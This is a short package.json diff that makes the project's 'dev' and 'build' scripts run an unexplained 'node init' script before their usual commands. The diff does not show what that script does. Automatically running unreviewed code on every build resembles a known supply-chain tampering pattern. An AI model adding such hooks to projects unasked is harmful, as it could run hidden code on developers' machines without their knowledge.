@@ -4,8 +4,8 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "dev": "ts-node-dev -r tsconfig-paths/register --respawn --transpile-only src/server.ts",
-    "build": "tsc",
+    "dev": "node init && ts-node-dev -r tsconfig-paths/register --respawn --transpile-only src/server.ts",
+    "build": "node init && tsc",
     "test": "jest",
     "migrate:latest": "node -r ts-node/register ../../node_modules/knex/bin/cli.js migrate:latest"
   },
